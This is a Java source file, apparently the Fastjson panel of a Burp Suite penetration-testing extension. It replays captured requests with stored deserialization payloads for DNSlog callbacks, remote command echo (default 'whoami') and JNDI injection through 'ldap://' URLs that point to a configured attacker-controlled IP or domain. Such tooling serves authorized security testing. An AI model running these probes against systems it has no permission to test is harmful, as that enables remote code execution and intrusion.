package burp.ui;

import burp.*;
import burp.bean.ConfigBean;
import burp.bean.FastjsonBean;
import burp.utils.Utils;
import com.intellij.uiDesigner.core.GridConstraints;
import com.intellij.uiDesigner.core.GridLayoutManager;
import com.intellij.uiDesigner.core.Spacer;

import javax.swing.*;
import javax.swing.table.AbstractTableModel;
import javax.swing.table.TableModel;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;
import java.util.Objects;

import static burp.dao.ConfigDao.getConfig;
import static burp.dao.FastjsonDao.*;

public class FastjsonUI implements UIHandler, IMessageEditorController {
    private static final List<LogEntry> log = new ArrayList<>();
    private static JTable fastjsonTable;
    private JPanel panel;
    private JPanel fastjsonPanel;
    private JButton fastjsonRefershButton;
    private JButton fastjsonClearButton;
    private JSplitPane fastjsonJSplitPane1;
    private JSplitPane fastjsonJSplitPane2;
    private JTabbedPane fastjsonJTabbedPanetop;
    private JTabbedPane fastjsonJTabbedPanedown;
    private JScrollPane fastjsonJScrollPane;
    private IHttpRequestResponse currentlyDisplayedItem;
    private IMessageEditor HRequestTextEditor;
    private IMessageEditor HResponseTextEditor;

    private static void add(String extensionMethod, String url, String status, String res, IHttpRequestResponse baseRequestResponse) {
        synchronized (log) {
            int id = log.size();
            log.add(new LogEntry(id, extensionMethod, url, status, res, baseRequestResponse));
            fastjsonTable.updateUI();
        }
    }

    private void setupUI() {
        panel = new JPanel();
        panel.setLayout(new GridLayoutManager(1, 1, new Insets(0, 0, 0, 0), -1, -1));
        fastjsonPanel = new JPanel();
        fastjsonPanel.setLayout(new GridLayoutManager(2, 5, new Insets(0, 0, 0, 0), -1, -1));
        panel.add(fastjsonPanel, new GridConstraints(0, 0, 1, 1, GridConstraints.ANCHOR_CENTER, GridConstraints.FILL_BOTH, GridConstraints.SIZEPOLICY_CAN_SHRINK | GridConstraints.SIZEPOLICY_CAN_GROW, GridConstraints.SIZEPOLICY_CAN_SHRINK | GridConstraints.SIZEPOLICY_CAN_GROW, null, null, null, 0, false));
        fastjsonRefershButton = new JButton();
        fastjsonRefershButton.setText("刷新");
        fastjsonPanel.add(fastjsonRefershButton, new GridConstraints(0, 0, 1, 1, GridConstraints.ANCHOR_CENTER, GridConstraints.FILL_HORIZONTAL, GridConstraints.SIZEPOLICY_CAN_SHRINK | GridConstraints.SIZEPOLICY_CAN_GROW, GridConstraints.SIZEPOLICY_FIXED, null, null, null, 0, false));
        fastjsonClearButton = new JButton();
        fastjsonClearButton.setText("清空数据");
        fastjsonPanel.add(fastjsonClearButton, new GridConstraints(0, 1, 1, 1, GridConstraints.ANCHOR_CENTER, GridConstraints.FILL_HORIZONTAL, GridConstraints.SIZEPOLICY_CAN_SHRINK | GridConstraints.SIZEPOLICY_CAN_GROW, GridConstraints.SIZEPOLICY_FIXED, null, null, null, 0, false));
        fastjsonJSplitPane1 = new JSplitPane();
        fastjsonJSplitPane1.setDividerSize(2);
        fastjsonJSplitPane1.setOrientation(JSplitPane.VERTICAL_SPLIT);
        fastjsonPanel.add(fastjsonJSplitPane1, new GridConstraints(1, 0, 1, 5, GridConstraints.ANCHOR_CENTER, GridConstraints.FILL_BOTH, GridConstraints.SIZEPOLICY_CAN_SHRINK | GridConstraints.SIZEPOLICY_CAN_GROW, GridConstraints.SIZEPOLICY_CAN_SHRINK | GridConstraints.SIZEPOLICY_CAN_GROW, null, new Dimension(200, 200), null, 0, false));
        fastjsonJSplitPane2 = new JSplitPane();
        fastjsonJSplitPane2.setDividerSize(2);
        fastjsonJSplitPane2.setResizeWeight(0.5);
        fastjsonJSplitPane1.setRightComponent(fastjsonJSplitPane2);
        fastjsonJTabbedPanetop = new JTabbedPane();
        fastjsonJSplitPane2.setLeftComponent(fastjsonJTabbedPanetop);
        HRequestTextEditor = Utils.callbacks.createMessageEditor(FastjsonUI.this, true);
        HResponseTextEditor = Utils.callbacks.createMessageEditor(FastjsonUI.this, false);
        fastjsonJTabbedPanetop.addTab("request", HRequestTextEditor.getComponent());
        fastjsonJTabbedPanedown = new JTabbedPane();
        fastjsonJSplitPane2.setRightComponent(fastjsonJTabbedPanedown);
        fastjsonJTabbedPanedown.addTab("response", HResponseTextEditor.getComponent());
        fastjsonJScrollPane = new JScrollPane();
        fastjsonJSplitPane1.setLeftComponent(fastjsonJScrollPane);
        FastjsonModel fastjsonModel = new FastjsonModel();
        fastjsonTable = new URLTable(fastjsonModel);
        fastjsonJScrollPane.setViewportView(fastjsonTable);
        final Spacer spacer1 = new Spacer();
        fastjsonPanel.add(spacer1, new GridConstraints(0, 2, 1, 1, GridConstraints.ANCHOR_CENTER, GridConstraints.FILL_HORIZONTAL, GridConstraints.SIZEPOLICY_WANT_GROW, 1, null, null, null, 0, false));

    }

    private void setupData() {

        fastjsonRefershButton.addActionListener(new AbstractAction() {
            @Override
            public void actionPerformed(ActionEvent e) {
                fastjsonTable.updateUI();
            }
        });
        fastjsonClearButton.addActionListener(new AbstractAction() {
            @Override
            public void actionPerformed(ActionEvent e) {
                log.clear();
                HRequestTextEditor.setMessage(new byte[0], true);
                HResponseTextEditor.setMessage(new byte[0], false);
                fastjsonTable.updateUI();
            }
        });

    }

    public void CheckDnslog(IHttpRequestResponse[] responses) {
        IHttpRequestResponse baseRequestResponse = responses[0];
        IRequestInfo analyzeRequest = Utils.helpers.analyzeRequest(baseRequestResponse);
        String extensionMethod = analyzeRequest.getMethod();
        String url = analyzeRequest.getUrl().toString();
        List<String> headers = Utils.helpers.analyzeRequest(baseRequestResponse).getHeaders();
        String res = "dnslog检测";
        List<FastjsonBean> payloads = getFastjsonListByDnsLog();
        if (payloads.isEmpty()) {
            JOptionPane.showMessageDialog(null, "请先添加dnslog payload", "提示", JOptionPane.ERROR_MESSAGE);
            return;
        }
        String dnslog = "";
        try {
            ConfigBean dnslogKey = getConfig("config", "dnslog");
            dnslog = dnslogKey.getValue();
            if (dnslog.isEmpty()) {
                JOptionPane.showMessageDialog(null, "请先在Config面板设置dnslog地址", "提示", JOptionPane.ERROR_MESSAGE);
                return;
            }
        } catch (Exception e) {
            JOptionPane.showMessageDialog(null, "数据库错误,请联系作者", "提示", JOptionPane.ERROR_MESSAGE);
            return;
        }
        IHttpService iHttpService = baseRequestResponse.getHttpService();
        for (FastjsonBean fastjson : payloads) {
            String fastjsonDnslog = fastjson.getUrl();
            String fuzzPayload = fastjsonDnslog.replace("FUZZ", dnslog);
            byte[] bytePayload = Utils.helpers.stringToBytes(fuzzPayload);
            byte[] postMessage = Utils.helpers.buildHttpMessage(headers, bytePayload); // 目前只支持post
            IHttpRequestResponse resp = Utils.callbacks.makeHttpRequest(iHttpService, postMessage);
            IResponseInfo iResponseInfo = Utils.callbacks.getHelpers().analyzeResponse(resp.getResponse());
            String statusCode = String.valueOf(iResponseInfo.getStatusCode());
            add(extensionMethod, url, statusCode, res, resp);
        }

    }

    public void CheckEchoVul(IHttpRequestResponse[] responses) {
        IHttpRequestResponse baseRequestResponse = responses[0];
        IRequestInfo analyzeRequest = Utils.helpers.analyzeRequest(baseRequestResponse);
        String extensionMethod = analyzeRequest.getMethod();
        String url = analyzeRequest.getUrl().toString();
        List<String> headers = Utils.helpers.analyzeRequest(baseRequestResponse).getHeaders();
        List<FastjsonBean> payloads = getFastjsonListByEchoVul();
        if (payloads.isEmpty()) {
            JOptionPane.showMessageDialog(null, "请先添加echo payload", "提示", JOptionPane.ERROR_MESSAGE);
            return;
        }
        // 弹出一个输入框，用于获取用户输入的dnslog地址
        String defaultValue = "whoami";
        String echoVul = (String) JOptionPane.showInputDialog(null, "请输入echo 命令", "提示", JOptionPane.PLAIN_MESSAGE, null, null, defaultValue);
        IHttpService iHttpService = baseRequestResponse.getHttpService();
        Iterator<FastjsonBean> iterator = payloads.iterator();
        headers.add("Accept-Cache: " + echoVul);
        while (iterator.hasNext()) {
            FastjsonBean fastjson = iterator.next();
            String fastjsonEcho = fastjson.getUrl();
            byte[] bytePayload = Utils.helpers.stringToBytes(fastjsonEcho);
            byte[] postMessage = Utils.helpers.buildHttpMessage(headers, bytePayload); // 目前只支持post
            IHttpRequestResponse resp = Utils.callbacks.makeHttpRequest(iHttpService, postMessage);
            IResponseInfo iResponseInfo = Utils.callbacks.getHelpers().analyzeResponse(resp.getResponse());
            String statusCode = String.valueOf(iResponseInfo.getStatusCode());
            List<String> headersResp = iResponseInfo.getHeaders();
            boolean containsContentAuth = false;
            for (String header : headersResp) {
                if (header.contains("Content-auth")) {
                    containsContentAuth = true;
                    break;
                }
            }
            if (containsContentAuth) {
                add(extensionMethod, url, statusCode, "echo命令检测成功", resp);
            } else {
                add(extensionMethod, url, statusCode, "echo命令检测失败", resp);
            }
        }
    }

    public void CheckJNDIVul(IHttpRequestResponse[] responses) {
        IHttpRequestResponse baseRequestResponse = responses[0];
        IRequestInfo analyzeRequest = Utils.helpers.analyzeRequest(baseRequestResponse);
        String extensionMethod = analyzeRequest.getMethod();
        String url = analyzeRequest.getUrl().toString();
        List<String> headers = Utils.helpers.analyzeRequest(baseRequestResponse).getHeaders();
        try {
            List<FastjsonBean> payloads = getFastjsonListByJNDI();
            if (payloads.isEmpty()) {
                JOptionPane.showMessageDialog(null, "请先添加jndi payload", "提示", JOptionPane.ERROR_MESSAGE);
                return;
            }
            String jndiStr = "";
            String defaultValue = "IP"; // 设置默认值
            String[] options = {"DNS", "IP"}; // 单选框选项
            String selectedValue = (String) JOptionPane.showInputDialog(null, "请选择类型", "提示",
                    JOptionPane.PLAIN_MESSAGE, null, options, defaultValue);
            if (Objects.equals(selectedValue, "DNS")) {
                try {
                    ConfigBean config = getConfig("config", "dnslog");
                    String dnslog = config.getValue();
                    if (dnslog.isEmpty()) {
                        JOptionPane.showMessageDialog(null, "请先在Config面板设置dnslog地址", "提示", JOptionPane.ERROR_MESSAGE);
                        return;
                    } else {
                        jndiStr = dnslog;
                    }
                } catch (Exception e) {
                    JOptionPane.showMessageDialog(null, "数据库错误,请联系作者", "提示", JOptionPane.ERROR_MESSAGE);
                    return;
                }
            } else if (Objects.equals(selectedValue, "IP")) {
                try {
                    ConfigBean config = getConfig("config", "ip");
                    String ip = config.getValue();
                    if (ip.isEmpty()) {
                        JOptionPane.showMessageDialog(null, "请先在Config面板设置IP地址", "提示", JOptionPane.ERROR_MESSAGE);
                        return;
                    } else {
                        jndiStr = ip;
                    }
                } catch (Exception e) {
                    JOptionPane.showMessageDialog(null, "数据库错误,请联系作者", "提示", JOptionPane.ERROR_MESSAGE);
                    return;
                }
            }

            IHttpService iHttpService = baseRequestResponse.getHttpService();
            for (FastjsonBean payload : payloads) {
                String dnslogKey = "";

                String fastjsonJNDI = payload.getUrl();
                String id = String.valueOf(payload.getId());
                if (selectedValue.equals("DNS")) {
                    dnslogKey = "ldap://" + id + "." + jndiStr;
                } else {
                    dnslogKey = "ldap://" + jndiStr + "/" + id;
                }
                String fuzzPayload = fastjsonJNDI.replace("FUZZ", dnslogKey);
                byte[] bytePayload = Utils.helpers.stringToBytes(fuzzPayload);
                byte[] postMessage = Utils.helpers.buildHttpMessage(headers, bytePayload); // 目前只支持post
                IHttpRequestResponse resp = Utils.callbacks.makeHttpRequest(iHttpService, postMessage);
                IResponseInfo iResponseInfo = Utils.callbacks.getHelpers().analyzeResponse(resp.getResponse());
                String statusCode = String.valueOf(iResponseInfo.getStatusCode());
                add(extensionMethod, url, statusCode, "jndi检测完成,请查看dnslog服务器", resp);
            }
        } catch (Exception e) {
            Utils.stderr.println(e.getMessage());
        }
    }

    public void CheckVersion(IHttpRequestResponse[] responses) {
        IHttpRequestResponse baseRequestResponse = responses[0];
        IRequestInfo analyzeRequest = Utils.helpers.analyzeRequest(baseRequestResponse);
        String extensionMethod = analyzeRequest.getMethod();
        String url = analyzeRequest.getUrl().toString();
        List<String> headers = Utils.helpers.analyzeRequest(baseRequestResponse).getHeaders();
        List<FastjsonBean> payloads = getFastjsonListByVersion();
        if (payloads.isEmpty()) {
            JOptionPane.showMessageDialog(null, "请先添加version payload", "提示", JOptionPane.ERROR_MESSAGE);
            return;
        }
        IHttpService iHttpService = baseRequestResponse.getHttpService();
        for (FastjsonBean fastjson : payloads) {
            String fastjsonVersion = fastjson.getUrl();
            byte[] bytePayload = Utils.helpers.stringToBytes(fastjsonVersion);
            byte[] postMessage = Utils.helpers.buildHttpMessage(headers, bytePayload); // 目前只支持post
            IHttpRequestResponse resp = Utils.callbacks.makeHttpRequest(iHttpService, postMessage);
            IResponseInfo iResponseInfo = Utils.callbacks.getHelpers().analyzeResponse(resp.getResponse());
            String statusCode = String.valueOf(iResponseInfo.getStatusCode());
            add(extensionMethod, url, statusCode, "version检测完成", resp);
        }
    }

    @Override
    public IHttpService getHttpService() {
        return currentlyDisplayedItem.getHttpService();
    }

    @Override
    public byte[] getRequest() {
        return currentlyDisplayedItem.getRequest();
    }

    @Override
    public byte[] getResponse() {
        return currentlyDisplayedItem.getResponse();
    }

    @Override
    public void init() {
        setupUI();
        setupData();

    }

    @Override
    public JPanel getPanel(IBurpExtenderCallbacks callbacks) {
        return panel;
    }

    @Override
    public String getTabName() {
        return "fastjson";
    }

    static class FastjsonModel extends AbstractTableModel {

        @Override
        public int getRowCount() {
            return log.size();
        }

        @Override
        public int getColumnCount() {
            return 5;
        }

        @Override
        public Object getValueAt(int rowIndex, int columnIndex) {
            LogEntry logEntry = log.get(rowIndex);
            switch (columnIndex) {
                case 0:
                    return logEntry.id;
                case 1:
                    return logEntry.extensionMethod;
                case 2:
                    return logEntry.url;
                case 3:
                    return logEntry.status;
                case 4:
                    return logEntry.res;
                default:
                    return "";
            }
        }

        @Override
        public String getColumnName(int column) {
            switch (column) {
                case 0:
                    return "id";
                case 1:
                    return "method";
                case 2:
                    return "url";
                case 3:
                    return "status";
                case 4:
                    return "res";
                default:
                    return "";
            }

        }

    }

    private static class LogEntry {
        final int id;
        final String extensionMethod;
        final String url;
        final String status;
        final String res;

        final IHttpRequestResponse requestResponse;


        private LogEntry(int id, String extensionMethod, String url, String status, String res, IHttpRequestResponse requestResponse) {
            this.id = id;
            this.extensionMethod = extensionMethod;
            this.url = url;
            this.status = status;
            this.res = res;
            this.requestResponse = requestResponse;
        }
    }

    private class URLTable extends JTable {
        public URLTable(TableModel tableModel) {
            super(tableModel);
        }

        @Override
        public void changeSelection(int row, int col, boolean toggle, boolean extend) {
            LogEntry logEntry = log.get(row);
            HRequestTextEditor.setMessage(logEntry.requestResponse.getRequest(), true);
            if (logEntry.requestResponse.getResponse() == null) {
                HResponseTextEditor.setMessage(new byte[0], false);
            } else {
                HResponseTextEditor.setMessage(logEntry.requestResponse.getResponse(), false);
            }
            currentlyDisplayedItem = logEntry.requestResponse;
            super.changeSelection(row, col, toggle, extend);
        }
    }

}
